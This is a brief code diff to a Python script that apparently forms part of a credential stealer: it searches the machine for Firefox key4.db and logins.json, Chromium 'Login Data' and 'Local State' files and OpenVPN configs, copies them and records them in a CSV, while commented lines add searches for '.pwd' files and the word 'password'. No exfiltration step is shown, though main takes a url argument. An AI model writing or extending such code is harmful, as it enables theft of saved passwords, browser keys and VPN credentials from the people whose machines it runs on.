@@ -6,9 +6,10 @@ from helpers import utils, find_files, csv_manager, filemanager
 
 
 def main(url):
-    system_information = utils.system_information()
     csv_manager.init()
     search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']
+    # search_files = ['.pwd']
+    # contain_text = ['password']
     files = filemanager.search_files(search_files)
     filenames = filemanager.copy_files(files)
     csv_manager.add_rows(filenames)
